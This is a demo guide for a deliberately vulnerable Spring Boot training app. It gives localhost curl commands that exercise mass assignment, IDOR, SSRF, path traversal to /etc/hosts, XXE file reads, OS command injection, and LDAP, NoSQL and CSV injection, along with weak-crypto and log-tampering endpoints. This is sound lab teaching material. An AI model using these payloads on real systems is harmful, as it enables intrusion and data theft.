# Vulnerable App — Endpoint Usage & Demo Guide
**Environment:** Local lab only. Do **not** expose to the internet.

This guide is tailored to the endpoints shown in your repo’s READMEs and the controllers present in your tree.

> Tip: use a cookie jar so curls stay logged in:
> ```bash
> JAR=cookies.txt
> ```

---

## 0) Run the app
```bash
mvn spring-boot:run
# App on http://localhost:8080
```

---

## 1) Auth & Session

### 1.1 Login (AuthController)
```bash
curl -i -X POST "http://localhost:8080/auth/login?username=alice&password=password1" -c "$JAR" -b "$JAR"
```
- If success, you’ll get a session cookie. Some builds also echo a weak JWT or user info.

### 1.2 Create Session (SessionController)
```bash
curl -i -X POST "http://localhost:8080/session/create" -c "$JAR" -b "$JAR"
```

---

## 2) Users & Data Exposure (UserController)

### 2.1 List users (leaks internal fields per README)
```bash
curl -s "http://localhost:8080/users" -c "$JAR" -b "$JAR"
```
Look for `passwordHash`, `jwtToken`, flags, etc.

---

## 3) Orders & Authorization (OrdersController)

### 3.1 Create order (Mass Assignment possible)
```bash
curl -s -X POST "http://localhost:8080/orders"   -H "Content-Type: application/json" -c "$JAR" -b "$JAR"   -d '{"itemName":"demo","quantity":1,"status":"open","ownerId":"00000000-0000-0000-0000-000000000001","isAdminFlag":true}'
```
Server may accept server-controlled fields (ownerId/isAdminFlag).

### 3.2 Read by ID (BOLA/IDOR demo)
```bash
ORDER_ID="<uuid-you-saw>"
curl -s "http://localhost:8080/orders/$ORDER_ID" -c "$JAR" -b "$JAR"
```
Try other users’ IDs to show missing ownership checks.

### 3.3 Export All (resource abuse)
```bash
curl -i "http://localhost:8080/orders/exportAll" -c "$JAR" -b "$JAR"
```

---

## 4) Automation / Abuse (Pipeline or dedicated controller)

### 4.1 Bulk create (no throttling)
```bash
curl -i -X POST "http://localhost:8080/automation/bulkCreate?count=5000" -c "$JAR" -b "$JAR"
```
Be gentle; your VM may slow down.

---

## 5) SSRF & TLS Trust-All (ProxyController)

### 5.1 Safe local SSRF demo
Start a tiny server locally:
```bash
python3 -m http.server 9000 &
echo "SECRET: mock-metadata" > /tmp/mock-meta.txt
```
Fetch via app:
```bash
curl -s "http://localhost:8080/proxy?url=http://127.0.0.1:9000/mock-meta.txt"
```
**Note:** For HTTPS, the client trusts all certs (legacy, insecure).

---

## 6) Admin Function without AuthZ (AdminController)

### 6.1 Delete user (BFLA)
```bash
curl -i -X DELETE "http://localhost:8080/admin/users/<user-id>" -c "$JAR" -b "$JAR"
```

---

## 7) Step 2 Add‑ons (extra vulnerable surfaces)

### 7.1 File upload & traversal (if present)
Upload:
```bash
curl -i -X POST "http://localhost:8080/files/upload"   -F "file=@/etc/hosts" -F "name=note.txt" -c "$JAR" -b "$JAR"
```
Read (attempt traversal):
```bash
curl -s "http://localhost:8080/files/read?name=../../../../etc/hosts" -c "$JAR" -b "$JAR"
```

### 7.2 Insecure deserialization
```bash
# Endpoint accepts raw serialized bytes (demo only; no gadget chain here)
curl -i -X POST "http://localhost:8080/files/deserialize" --data-binary @payload.bin -c "$JAR" -b "$JAR"
```

### 7.3 XXE
```bash
curl -i -X POST "http://localhost:8080/files/xxe"   -H "Content-Type: application/xml"   --data-binary @- <<'XML'
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///tmp/mock-meta.txt"> ]>
<root>&xxe;</root>
XML
```

### 7.4 XSLT injection
```bash
curl -s -X POST "http://localhost:8080/xml/transform"   -H "Content-Type: application/x-www-form-urlencoded"   --data-urlencode 'xml=<root><v>1</v></root>'   --data-urlencode 'xsl=<?xml version="1.0"?><xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0"><xsl:template match="/"><out><xsl:value-of select="system-property('xsl:vendor')"/></out></xsl:template></xsl:stylesheet>'
```

### 7.5 CSV injection
```bash
curl -s "http://localhost:8080/reports/csv?n=3&header==HACK"
```

### 7.6 OS command injection (SystemController)
```bash
curl -s "http://localhost:8080/system/exec?cmd=whoami"
```

### 7.7 LDAP injection (LdapController)
```bash
curl -s "http://localhost:8080/ldap/search?username=*)(uid=*)(&(ou=ops"
```

### 7.8 NoSQL injection (ApiController)
```bash
curl -s -X POST "http://localhost:8080/api/searchRaw" -H "Content-Type: application/json"   -d '{"name":{"$ne":null},"__proto__":{"polluted":true}}'
```

### 7.9 GraphQL (no limits)
```bash
curl -s -X POST "http://localhost:8080/graphql" -H "Content-Type: application/json"   -d '{"query":"{ __schema { types { name } } }"}'
```

---

## 8) Step 3 Add‑ons (crypto/TLS/observability/pipeline)

### 8.1 Weak crypto (CryptoController)
MD5:
```bash
curl -s "http://localhost:8080/crypto/md5?text=hello"
```
ECB encrypt/decrypt:
```bash
CT=$(curl -s "http://localhost:8080/crypto/weakEncrypt?text=HELLOHELLOHELLO")
curl -s "http://localhost:8080/crypto/weakDecrypt?b64=$CT"
```
Predictable token:
```bash
curl -s "http://localhost:8080/crypto/token"
```

Key store emulator:
```bash
curl -s "http://localhost:8080/crypto/storeKey?name=apiKey&value=secret123"
curl -s "http://localhost:8080/crypto/getKey?name=apiKey"
```

### 8.2 Legacy TLS client (ProxyController)
```bash
curl -s "http://localhost:8080/proxy?url=https://self-signed.bad"
```

### 8.3 GraphQL hard mode (GraphqlHardController)
```bash
curl -s "http://localhost:8080/graphql/hard?depth=6&introspect=true"
```

### 8.4 Pipeline/SBOM placeholders (PipelineController)
```bash
curl -s "http://localhost:8080/pipeline/runBuild"
curl -s "http://localhost:8080/pipeline/sbom"
curl -s "http://localhost:8080/pipeline/sign?stmt=hello"
curl -s "http://localhost:8080/pipeline/slsa"
curl -s "http://localhost:8080/pipeline/vex"
```

### 8.5 Observability anti-patterns (LogsController, DebugController)
Logs (tamper/exfiltrate):
```bash
curl -s "http://localhost:8080/logs/write?line=secret-line"
curl -s "http://localhost:8080/logs/tail"
curl -s "http://localhost:8080/logs/overwrite?line=oops"
curl -i -X DELETE "http://localhost:8080/logs"
```
Debug leakage:
```bash
curl -s "http://localhost:8080/debug/env"
curl -s "http://localhost:8080/debug/properties"
curl -s "http://localhost:8080/debug/threads"
```

---

## 9) Cleanup / Reset
- Most builds use in-memory H2; restart the app to reset state:
```bash
# Ctrl+C then:
mvn spring-boot:run
```

---

## Notes
- Some endpoints may require you to be logged in; always pass `-c "$JAR" -b "$JAR"` after logging in.
- If an endpoint name differs in your local build, check the controllers under `src/main/java/com/vulnapp/controllers` for the exact mapping.

